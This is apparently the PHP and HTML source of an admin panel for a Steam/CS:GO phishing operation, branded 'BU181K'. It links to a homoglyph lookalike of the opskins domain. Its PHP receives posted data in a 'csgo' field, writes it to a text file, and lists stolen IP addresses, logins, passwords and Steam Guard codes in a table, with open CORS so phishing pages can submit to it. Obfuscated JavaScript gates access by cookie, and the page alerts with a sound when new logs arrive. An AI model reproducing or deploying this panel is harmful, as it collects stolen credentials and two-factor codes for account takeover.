

<?php
include('config.php');
if(!isset($_COOKIE['tauth'])){
    print"<script>location.href='login.php'</script>";
}
?>



<!DOCTYPE html>
<!-- saved from url=(0033)http://a0149298.xsph.ru/table.php -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Security-Policy" content="default-src *; style-src * 'unsafe-inline'; script-src * 'unsafe-inline' 'unsafe-eval'; img-src * data: 'unsafe-inline'; connect-src * 'unsafe-inline'; frame-src *;">
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>bu181k new</title>

    <!-- Bootstrap -->


    <link href="./style_table.css" rel="stylesheet">
    <link href="./bootstrap.css" rel="stylesheet">
    <link href="./bootstrap-theme.css" rel="stylesheet">
    
    <script src="./jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="./bootstrap.js"></script>
  </head>
    <body>
        <script>
var _0x20f0=["\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x74\x61\x75\x74\x68","\x73\x6F\x73\x69","\x73\x68\x6F\x77","\x62\x6F\x64\x79","\x68\x69\x64\x65"];var _0x9059=[_0x20f0[0],_0x20f0[1],_0x20f0[2],_0x20f0[3],_0x20f0[4],_0x20f0[5],_0x20f0[6],_0x20f0[7],_0x20f0[8],_0x20f0[9],_0x20f0[10]];var _0xfb35=[_0x9059[0],_0x9059[1],_0x9059[2],_0x9059[3],_0x9059[4],_0x9059[5],_0x9059[6],_0x9059[7],_0x9059[8],_0x9059[9],_0x9059[10]];function getCookie(_0xe31fx4){var _0xe31fx5=document[_0xfb35[5]][_0xfb35[4]]( new RegExp(_0xfb35[0]+ _0xe31fx4[_0xfb35[2]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xfb35[1])+ _0xfb35[3]));return _0xe31fx5?decodeURIComponent(_0xe31fx5[1]):undefined}var cokoko=getCookie(_0xfb35[6]);if(cokoko== _0xfb35[7]){$(_0xfb35[9])[_0xfb35[8]]()}else {$(_0xfb35[9])[_0xfb35[10]]()}</script>
        <nav class="navbar navbar-inverse">        
            <div class="container-fluid">
                <div class="navbar-header">
                <a class="navbar-brand" href="
                /admin/admin.php" style="text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;">BU181K</a></div>
                <ul class="nav navbar-nav">
                <li class="active"><a href="
                /admin/admin.php">logs</a></li>
                <li class="dub">
    <input class="сhecka" type="checkbox" id="shest0" name="checkbox-test">
    
       <span class="labelb">включить обновление!</span>
</li>   
</ul>
            </div>
        </nav>
        <div class="other">
        <div class="container">
            <style>
             nav.navbar.navbar-inverse {
    margin-right: -100px;
}span.labelb {
    color: white;
}
            li.dub {
    height: 20px;
    margin-left: 20px;
    margin-top: 10px;
    /* padding-bottom: 20px; */
    /* padding-bottom: 20px; */
    font-size: 16px;
}
            body {
    margin-right: 100px;
  font-size: 13px;
            }
            button.button {
                    color: aqua;
    margin-right: 50%;
    margin-left: 48%;
    width: 100px;
    height: 30px;
    margin-top: 20px;
    border-radius: 20px;
    background-color: rgba(152, 46, 164, 0.78);
    /* color: aqua; */
}
@media (min-width: 992px) {
  .container {
   height: 400px;
    overflow: auto;
    width: 970px;
  }
}</style>
                   
           <table class="table table-bordered">
                <thead>
                <tr style="background-color: rgba(0, 90, 255, 0.85); opacity: 0.9;">
                    <th>IP</th>
                    <th>LOGIN</th>
                    <th>PASSWORD </th>
                    <th>GUARD</th>
                    
                    
                </tr>
                </thead>
                <tbody>
                    
                         
                           <?php
     
header('Access-Control-Allow-Origin: *');
if (isset($_POST) and $_SERVER["REQUEST_METHOD"]=="POST"){
    echo "dadsad";
}
//принимаем запрос
$text = $_POST['csgo'];


//открываем для чтения и записи 
$file = fopen("csgotm.txt", "a");


//запись в файл
fwrite($file, $text."\r\n");
fclose($file);
file_put_contents('csgotm.txt', array_unique(file('csgotm.txt'))); 


//запись  с новой строчки
 $array = file("csgotm.txt"); 
     
        
     for($i=0; $i < count($array); $i++) 
     
     { 
         $date= $array[$i];
    list($ip, $name, $value,$guard) = split(':', $date);
   
    
       printf("<tr  style='background-color: rgba(109, 40, 132, 0.85); opacity: 0.9;'>"."<td>".$ip."</td>"."<td>".$name."</td>"."<td>".$value."</td>"."<td>".$guard."</td>"."</tr>");
      } 
   

    
   
?>


                            
                                            </tbody>
            </table>
          
        </div>

        
 <button type="submit" class="button"  onclick="geter()">Очистить</button>
<script>
var c = document.querySelector('#shest0');
function run(){
    var interval = setInterval(function()
    {
        location.reload();
    }, 3000);
}
function setcook(){
    document.cookie="check=ok";
    
}
function changecook(){
    document.cookie="check=no";
    
}
setInterval(function() {
 if (c.checked) {
 setcook();
var interval = setInterval(function()
    {
        location.reload();
    }, 3000);

 } else {
     changecook();
    
 
 }
},1000);

</script>
<script>
var elements = document.querySelectorAll('td');

  for (var i = 0; i < elements.length; i++) {
   var count = i;
  }        function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}
var cookiess = getCookie("val"); 
if(cookiess<count){
    
    document.cookie="val="+count;
    alert("Новые логи!"); //добавить звук выстрела
    
    var audio = new Audio();
audio.preload = 'auto';
audio.src = 'https://opṣkins.com/admin/tr.mp3';
audio.play();
    
}
function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}
var cookiess = getCookie("check"); 
if(cookiess=="ok"){
    
    
    $("#shest0").attr('checked',true);
}


var elements = document.querySelectorAll('td');

  for (var i = 0; i < elements.length; i++) {
    var count = count+1;
  }
function geter(){
     document.cookie="val=7";
    alert("Clear!");
    window.location.assign("https://opṣkins.com/admin/admin.php")
  $.ajax({
    type: 'POST',
    url: '/admin/geter.php',
    crossDomain: true,
     data: {bul:"ge"},  
 
    dataType: 'html',
   
});
}
</script>
 </div>
        <nav class="navbar navbar-inverse navbar-fixed-bottom" style="opacity: 0.7">        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand" >Bulbik (rak_raklo)</a>
                </div>
                
            </div>
        </nav>
    
</body></html>